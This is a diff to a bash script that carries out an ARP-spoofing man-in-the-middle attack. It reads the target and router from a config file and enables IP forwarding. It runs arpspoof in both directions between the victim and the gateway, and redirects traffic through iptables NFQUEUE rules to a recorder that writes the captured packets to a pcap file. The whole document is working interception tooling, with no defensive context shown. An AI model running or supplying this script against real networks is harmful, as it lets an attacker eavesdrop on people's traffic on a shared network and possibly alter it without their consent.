@@ -9,26 +9,36 @@ interface=`jq -r '.interface' config.json`
 target=`jq -r '.target' config.json`
 router=`jq -r '.router' config.json`
 
+echo "" > log
+
 trap 'end' INT
 
 function end() {
-	kill $PID
+	kill $PID0
+	kill $PID1
 	kill $PID2
-	iptables -t nat -D PREROUTING 1
+#	iptables -t nat -D PREROUTING 1
 	iptables -t nat -D PREROUTING 1
 	echo "Shutting down..."
-	wait $PID
+	wait $PID0
+	wait $PID1
 }
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-iptables -t nat -A PREROUTING -i $interface -s $target -j NFQUEUE --queue-num 0
-iptables -t nat -A PREROUTING -i $interface -d $target -j NFQUEUE --queue-num 1
+#iptables -t nat -A PREROUTING -i $interface -s $target -j NFQUEUE --queue-num 0
+#iptables -t nat -A PREROUTING -i ens38 -d $target -j NFQUEUE --queue-num 0
+iptables -t nat -A PREROUTING -i $interface -j NFQUEUE --queue-num 0
+#iptables -t nat -A PREROUTING -i ens38 -j NFQUEUE --queue-num 0
 
-arpspoof -i $interface -t $target -r $router > /dev/null 2>&1 &
-PID=$!
+arpspoof -i $interface -t $target $router >> log 2>&1 &
+PID0=$!
 
-./intercept.py 2>&1 &
+arpspoof -i ens33 -t $router $target >> log 2>&1 &
+PID1=$!
+
+#./intercept.py 2>&1 &
+./nfqueue_recorder -o test.pcap
 PID2=$!
 
 cat
